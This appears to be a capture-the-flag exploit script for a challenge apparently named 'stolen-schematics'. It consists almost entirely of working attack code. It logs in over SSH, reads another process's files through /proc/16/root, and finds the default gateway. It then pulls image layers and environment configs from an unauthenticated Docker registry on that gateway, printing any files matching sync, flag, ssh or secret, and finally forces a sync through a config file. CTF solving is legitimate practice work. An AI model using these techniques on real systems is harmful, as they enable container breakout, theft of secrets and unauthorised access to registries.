#!/usr/bin/env python3
import paramiko, time, sys

HOST, PORT, USER, PW = "instance.ctf.tdho.st", 33039, "player", "reyalp"
ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
ssh.connect(HOST, port=PORT, username=USER, password=PW, timeout=12)

def cmd(c, t=25):
    i, o, e = ssh.exec_command(c, timeout=t)
    data = (o.read() + e.read()).decode(errors="replace")
    return data.encode("ascii", errors="replace").decode()

# Read sync-loop via /proc/16/root
print("=== SYNC-LOOP.SH ===")
print(cmd("python3 -c \"p='/proc/16/root/opt/mc/scripts/sync-loop.sh'; print(open(p).read())\" 2>&1"))

print("=== SYNC.RESULT VIA PROC ===")
print(cmd("python3 -c \"p='/proc/16/root/opt/mc/.sync/sync.result'; import os; print('exists',os.path.exists(p)); print(open(p).read() if os.path.exists(p) else 'n/a')\" 2>&1"))

print("=== LS .sync VIA PROC ===")
print(cmd("python3 -c \"import os; d='/proc/16/root/opt/mc/.sync'; print(os.listdir(d) if os.path.isdir(d) else 'no dir')\" 2>&1"))

# Extract only sync-loop from prerelease
print("=== EXTRACT PRERELEASE ===")
print(cmd(r"""python3 << 'PY'
import urllib.request, json, gzip, tarfile, io, socket, struct
def gw():
    with open('/proc/net/route') as f:
        next(f)
        for line in f:
            p=line.split()
            if p[1]=='00000000':
                return socket.inet_ntoa(struct.pack('<L', int(p[2],16)))
def get(u,h=None):
    r=urllib.request.Request(u, headers=h or {})
    return urllib.request.urlopen(r,timeout=10).read()
reg='http://'+gw()+':5000'
repo='images/stolen-schematics-gameserver'
tag='v1'
req=urllib.request.Request(reg+f'/v2/{repo}/manifests/{tag}', headers={'Accept':'application/vnd.docker.distribution.manifest.v2+json'})
m=json.loads(get(req.get_full_url(), dict(req.header_items())))
for layer in m['layers']:
    data=get(reg+f"/v2/{repo}/blobs/{layer['digest']}")
    for raw in [data, gzip.decompress(data) if data[:2]==b'\x1f\x8b' else b'']:
        if not raw: continue
        try: tf=tarfile.open(fileobj=io.BytesIO(raw), mode='r:*')
        except: continue
        for mem in tf.getmembers():
            if mem.isfile() and 'sync' in mem.name or 'watch' in mem.name or 'flag' in mem.name:
                print('FILE', mem.name)
                print(tf.extractfile(mem).read().decode(errors='replace')[:15000])
PY""", 60))

# Also gameserver current - compare with running sync-loop
print("=== EXTRACT INFRA ===")
print(cmd(r"""python3 << 'PY'
import urllib.request, json, gzip, tarfile, io, socket, struct
def gw():
    with open('/proc/net/route') as f:
        next(f)
        for line in f:
            p=line.split()
            if p[1]=='00000000':
                return socket.inet_ntoa(struct.pack('<L', int(p[2],16)))
def get(u,h=None):
    r=urllib.request.Request(u, headers=h or {})
    return urllib.request.urlopen(r,timeout=10).read()
reg='http://'+gw()+':5000'
for repo in ['infra/stolen-schematics','images/stolen-schematics-watcher','images/stolen-schematics-game-server-prerelease']:
    tags=json.loads(get(reg+f'/v2/{repo}/tags/list')).get('tags') or []
    for tag in tags:
        try:
            req=urllib.request.Request(reg+f'/v2/{repo}/manifests/{tag}', headers={'Accept':'application/vnd.docker.distribution.manifest.v2+json'})
            m=json.loads(get(req.get_full_url(), dict(req.header_items())))
        except Exception as e:
            print('skip',repo,tag,e); continue
        print('IMAGE',repo,tag)
        for layer in m.get('layers',[]):
            data=get(reg+f"/v2/{repo}/blobs/{layer['digest']}")
            for raw in [data, gzip.decompress(data) if data[:2]==b'\x1f\x8b' else b'']:
                if not raw: continue
                try: tf=tarfile.open(fileobj=io.BytesIO(raw), mode='r:*')
                except: continue
                for mem in tf.getmembers():
                    if not mem.isfile(): continue
                    n=mem.name
                    if any(x in n for x in ['sync','watch','flag','ssh','secret']):
                        b=tf.extractfile(mem).read()
                        print('FILE',repo,tag,n,len(b))
                        print(b.decode(errors='replace')[:15000])
        if 'config' in m:
            cfg=json.loads(get(reg+f"/v2/{repo}/blobs/{m['config']['digest']}"))
            env=cfg.get('config',{}).get('Env',[])
            if env: print('ENV',repo,tag,env)
PY""", 90))

# Trigger sync
print("=== SYNC TRIGGER ===")
cmd('echo "talldwarf-sync-force=true" > /opt/mc/config/sync-request.conf')
for i in range(6):
    time.sleep(5)
    print(f"t+{(i+1)*5}s", cmd("cat /opt/mc/config/sync-result.conf 2>&1; python3 -c \"p='/proc/16/root/opt/mc/.sync/sync.result'; print(open(p).read() if __import__('os').path.exists(p) else 'no')\" 2>&1"))

ssh.close()
